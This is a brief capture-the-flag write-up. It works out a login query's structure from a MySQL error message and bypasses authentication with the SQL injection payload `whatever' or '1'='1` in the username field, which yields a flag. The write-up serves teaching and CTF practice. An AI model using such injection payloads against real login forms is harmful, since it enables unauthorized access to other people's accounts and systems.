# Most basic SQLi pattern

## Solution

By submitting `test'` we receive the following error message:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''test'' AND password = ''' at line 1
```

This tells us the SQL statement server side looks like:

```
SELECT ... FROM ... WHERE username='$username' AND password='$password'
```

Single quote are not escaped. We are able to log using as a username `test' or '1'='1` and as a password an empty value:

```
SELECT ... FROM ... WHERE username='test' or '1'='1' AND password=''
```

|Field  | Value |
| ------------- | ------------- |
|username|whatever' or '1'='1|
|password|/* Any value, does not matter */|

And we obtain the Flag `FLAG-238974289383274893`
